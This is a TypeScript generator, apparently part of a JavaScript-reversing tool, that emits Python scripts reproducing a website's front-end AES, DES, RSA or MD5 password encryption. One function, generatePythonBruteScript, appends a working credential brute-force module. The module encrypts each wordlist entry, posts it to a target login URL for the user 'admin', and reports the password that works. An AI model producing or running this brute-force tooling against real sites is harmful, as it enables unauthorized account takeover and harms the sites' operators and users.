/**
 * Python解密脚本模板生成器
 */

export interface ScriptParams {
  algorithm: string;
  key?: string;
  iv?: string;
  mode?: string;
  padding?: string;
  encoding?: string;
  publicKey?: string;
  loginUrl?: string;
  paramName?: string;
  testPlaintext?: string;
  testCiphertext?: string;
}

export function generatePythonDecryptScript(params: ScriptParams): string {
  switch (params.algorithm.toUpperCase()) {
    case "AES-CBC":
    case "AES-ECB":
    case "AES":
      return generatePythonAES(params);
    case "DES":
    case "3DES":
    case "TRIPLEDES":
      return generatePythonDES(params);
    case "RSA":
      return generatePythonRSA(params);
    case "MD5":
      return generatePythonMD5(params);
    default:
      return generatePythonCustom(params);
  }
}

export function generatePythonEncryptScript(params: ScriptParams): string {
  // 加密脚本与解密脚本结构相同，只是函数名不同
  return generatePythonDecryptScript(params);
}

export function generatePythonBruteScript(params: ScriptParams): string {
  const base = generatePythonDecryptScript(params);
  return `${base}

# ====== 暴力破解模块 ======
import requests
import time

LOGIN_URL = "${params.loginUrl || "http://target.com/api/login"}"
PARAM_NAME = "${params.paramName || "password"}"

def brute_force(username: str, wordlist_path: str, delay: float = 0.5):
    """
    暴力破解登录
    :param username: 用户名
    :param wordlist_path: 密码字典文件路径
    :param delay: 每次请求间隔（秒）
    """
    with open(wordlist_path, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"[*] 开始暴力破解，共 {len(passwords)} 个密码")
    
    for i, pwd in enumerate(passwords):
        encrypted_pwd = encrypt(pwd)
        
        data = {
            "username": username,
            PARAM_NAME: encrypted_pwd
        }
        
        try:
            resp = requests.post(LOGIN_URL, json=data, timeout=10)
            result = resp.json()
            
            # 根据实际响应判断是否成功（需要根据目标调整）
            if resp.status_code == 200 and "success" in str(result).lower():
                print(f"\\n[+] 破解成功! 密码: {pwd}")
                print(f"    加密后: {encrypted_pwd}")
                print(f"    响应: {result}")
                return pwd
            else:
                print(f"  [{i+1}/{len(passwords)}] 尝试: {pwd} -> 失败")
        
        except Exception as e:
            print(f"  [{i+1}/{len(passwords)}] 错误: {e}")
        
        time.sleep(delay)
    
    print("[-] 暴力破解结束，未找到正确密码")
    return None

if __name__ == "__main__":
    # 使用示例
    result = brute_force(
        username="admin",
        wordlist_path="wordlist.txt",  # 密码字典文件
        delay=0.3
    )
`;
}

function generatePythonAES(params: ScriptParams): string {
  const mode = params.mode?.toUpperCase().includes("ECB") ? "ECB" : "CBC";
  const padding = params.padding || "PKCS7";

  return `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AES ${mode} 加密/解密脚本
自动生成 by js-reverse-mcp

算法: AES-${mode}
密钥: ${params.key || "需要填入"}
IV:   ${mode === "CBC" ? (params.iv || "需要填入") : "N/A (ECB模式不需要IV)"}
填充: ${padding}
编码: ${params.encoding || "Base64"}
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# ====== 配置参数 ======
KEY = "${params.key || "1234567890abcdef"}"  # 密钥
${mode === "CBC" ? `IV = "${params.iv || "1234567890abcdef"}"   # 偏移量` : "# ECB模式不需要IV"}
ENCODING = "${params.encoding || "base64"}"  # 输出编码: base64 或 hex

def encrypt(plaintext: str) -> str:
    """AES加密"""
    key_bytes = KEY.encode('utf-8')
    ${mode === "CBC" ? "iv_bytes = IV.encode('utf-8')" : ""}
    data = plaintext.encode('utf-8')
    
    # PKCS7填充
    padded_data = pad(data, AES.block_size)
    
    # 创建加密器
    ${mode === "CBC" ? "cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)" : "cipher = AES.new(key_bytes, AES.MODE_ECB)"}
    encrypted = cipher.encrypt(padded_data)
    
    # 编码输出
    if ENCODING == "hex":
        return encrypted.hex()
    else:
        return base64.b64encode(encrypted).decode('utf-8')

def decrypt(ciphertext: str) -> str:
    """AES解密"""
    key_bytes = KEY.encode('utf-8')
    ${mode === "CBC" ? "iv_bytes = IV.encode('utf-8')" : ""}
    
    # 解码输入
    if ENCODING == "hex":
        encrypted = bytes.fromhex(ciphertext)
    else:
        encrypted = base64.b64decode(ciphertext)
    
    # 创建解密器
    ${mode === "CBC" ? "cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)" : "cipher = AES.new(key_bytes, AES.MODE_ECB)"}
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
    
    return decrypted.decode('utf-8')

if __name__ == "__main__":
    # 测试
    test_plaintext = "${params.testPlaintext || "admin123"}"
    
    encrypted = encrypt(test_plaintext)
    print(f"明文: {test_plaintext}")
    print(f"加密: {encrypted}")
    
    decrypted = decrypt(encrypted)
    print(f"解密: {decrypted}")
    
    ${params.testCiphertext ? `
    # 验证与目标密文是否一致
    target_ciphertext = "${params.testCiphertext}"
    print(f"\\n目标密文: {target_ciphertext}")
    print(f"计算密文: {encrypted}")
    print(f"是否匹配: {'✅ 匹配' if encrypted == target_ciphertext else '❌ 不匹配'}")` : ""}
    
    assert decrypted == test_plaintext, "解密验证失败!"
    print("\\n✅ 加密解密验证通过!")
`;
}

function generatePythonDES(params: ScriptParams): string {
  const is3DES = params.algorithm.toUpperCase().includes("3") || params.algorithm.toUpperCase().includes("TRIPLE");
  return `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
${is3DES ? "3DES (TripleDES)" : "DES"} 加密/解密脚本
自动生成 by js-reverse-mcp
"""

from Crypto.Cipher import ${is3DES ? "DES3" : "DES"}
from Crypto.Util.Padding import pad, unpad
import base64

KEY = "${params.key || (is3DES ? "123456789012345678901234" : "12345678")}"
${params.iv ? `IV = "${params.iv}"` : "# IV = 'your_iv_here'  # 如果是CBC模式需要设置"}

def encrypt(plaintext: str) -> str:
    key_bytes = KEY.encode('utf-8')
    data = pad(plaintext.encode('utf-8'), ${is3DES ? "DES3" : "DES"}.block_size)
    cipher = ${is3DES ? "DES3" : "DES"}.new(key_bytes, ${is3DES ? "DES3" : "DES"}.MODE_ECB)
    encrypted = cipher.encrypt(data)
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt(ciphertext: str) -> str:
    key_bytes = KEY.encode('utf-8')
    encrypted = base64.b64decode(ciphertext)
    cipher = ${is3DES ? "DES3" : "DES"}.new(key_bytes, ${is3DES ? "DES3" : "DES"}.MODE_ECB)
    decrypted = unpad(cipher.decrypt(encrypted), ${is3DES ? "DES3" : "DES"}.block_size)
    return decrypted.decode('utf-8')

if __name__ == "__main__":
    test = "${params.testPlaintext || "admin123"}"
    enc = encrypt(test)
    dec = decrypt(enc)
    print(f"明文: {test}")
    print(f"加密: {enc}")
    print(f"解密: {dec}")
    assert dec == test, "验证失败!"
    print("✅ 验证通过!")
`;
}

function generatePythonRSA(params: ScriptParams): string {
  return `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RSA 加密脚本
自动生成 by js-reverse-mcp
注意: RSA通常只用于加密（使用公钥），无法解密（除非有私钥）
"""

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

# 公钥（从JS代码中提取）
PUBLIC_KEY = """${params.publicKey || "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...\n-----END PUBLIC KEY-----"}"""

def encrypt(plaintext: str) -> str:
    """RSA加密"""
    key = RSA.import_key(PUBLIC_KEY)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(plaintext.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')

if __name__ == "__main__":
    test = "${params.testPlaintext || "admin123"}"
    enc = encrypt(test)
    print(f"明文: {test}")
    print(f"加密: {enc}")
    print(f"密文长度: {len(enc)}")
    print("\\n注意: RSA加密每次结果不同（PKCS1v1.5填充包含随机数）")
`;
}

function generatePythonMD5(params: ScriptParams): string {
  return `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MD5 哈希脚本
自动生成 by js-reverse-mcp
注意: MD5是不可逆的哈希算法，不能"解密"
"""

import hashlib

def md5_hash(plaintext: str) -> str:
    """计算MD5哈希"""
    return hashlib.md5(plaintext.encode('utf-8')).hexdigest()

def md5_hash_upper(plaintext: str) -> str:
    """计算MD5哈希（大写）"""
    return md5_hash(plaintext).upper()

def double_md5(plaintext: str) -> str:
    """双重MD5"""
    return md5_hash(md5_hash(plaintext))

def md5_with_salt(plaintext: str, salt: str) -> str:
    """加盐MD5"""
    return md5_hash(plaintext + salt)

if __name__ == "__main__":
    test = "${params.testPlaintext || "admin123"}"
    print(f"明文: {test}")
    print(f"MD5(小写): {md5_hash(test)}")
    print(f"MD5(大写): {md5_hash_upper(test)}")
    print(f"双重MD5: {double_md5(test)}")
    ${params.testCiphertext ? `
    target = "${params.testCiphertext}"
    result = md5_hash(test)
    print(f"\\n目标哈希: {target}")
    print(f"计算哈希: {result}")
    print(f"是否匹配: {'✅' if result == target else '❌'}")` : ""}
`;
}

function generatePythonCustom(params: ScriptParams): string {
  return `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自定义加密/解密脚本
算法: ${params.algorithm}
自动生成 by js-reverse-mcp

请根据实际JS逆向结果填充加密逻辑
"""

import base64
import hashlib

# ====== 从JS逆向中提取的参数 ======
KEY = "${params.key || "your_key_here"}"
${params.iv ? `IV = "${params.iv}"` : "# IV = 'your_iv_here'"}

def encrypt(plaintext: str) -> str:
    """
    加密函数 - 请根据JS逆向结果实现
    """
    # TODO: 根据JS代码中的加密逻辑实现
    # 示例:
    # 1. 如果是简单Base64: return base64.b64encode(plaintext.encode()).decode()
    # 2. 如果是MD5+Base64: return base64.b64encode(hashlib.md5(plaintext.encode()).digest()).decode()
    # 3. 如果是自定义异或: return xor_encrypt(plaintext, KEY)
    
    raise NotImplementedError("请根据JS逆向结果实现加密逻辑")

def decrypt(ciphertext: str) -> str:
    """
    解密函数
    """
    raise NotImplementedError("请根据JS逆向结果实现解密逻辑")

if __name__ == "__main__":
    test = "${params.testPlaintext || "test_password"}"
    try:
        enc = encrypt(test)
        print(f"明文: {test}")
        print(f"加密: {enc}")
    except NotImplementedError as e:
        print(f"⚠️ {e}")
        print("请根据JS逆向分析结果完善加密逻辑")
`;
}
